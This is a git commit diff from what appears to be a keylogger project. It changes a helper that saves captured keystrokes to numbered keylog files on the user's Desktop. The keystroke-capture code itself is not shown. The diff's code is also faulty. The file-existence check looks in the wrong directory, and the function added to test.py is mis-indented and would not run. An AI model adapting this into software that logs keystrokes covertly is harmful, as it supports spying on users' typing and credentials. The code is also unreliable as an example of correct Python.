9992f33ef89a27ef193642c78797f25543c5bc99
Daniel Lee <jhyunglee.cs@gmail.com>
2023-03-24 01:40:57 -0400

    new file creation not working.

--- primary/savefile.py
+++ primary/savefile.py
@@ -2,15 +2,15 @@ from loggermain import keylogger
 import os 
 
 def savefile(keylog):
-    file_path_keylog = os.path.join(os.path.expanduser("~/Desktop"), "keylog.txt")
-
-    # Open the file for writing
+    count = 0
+    file_name = "keylog.txt"
+    while os.path.exists(file_name):
+        count += 1
+        file_name = f"keylog{count}.txt"
+    file_path_keylog = os.path.join(os.path.expanduser("~/Desktop"), file_name)
     with open(file_path_keylog, "w") as f:
-        # Write each element of the list to a new line in the file
         for item in keylog:
-            f.write(str(item)+ ", ")
-    
-    keylog_str = [str(item) for item in keylog]
-    
-
+            f.write(str(item) + ", ")
     print("File saved to", file_path_keylog)
+
+
--- primary/test.py
+++ primary/test.py
@@ -1,4 +1,23 @@
 
 
 
+    def savefile(keylog):
+    file_name = "keylog.txt"
+    count = 0
+    while os.path.exists(file_name):
+        count += 1
+        file_name = f"keylog{count}.txt"
     
+    file_path_keylog = os.path.join(os.path.expanduser("~/Desktop"), file_name)
+
+
+    # Open the file for writing
+    with open(file_path_keylog, "w") as f:
+        # Write each element of the list to a new line in the file
+        for item in keylog:
+            f.write(str(item)+ ", ")
+    
+    keylog_str = [str(item) for item in keylog]
+    
+
+    print("File saved to", file_path_keylog)
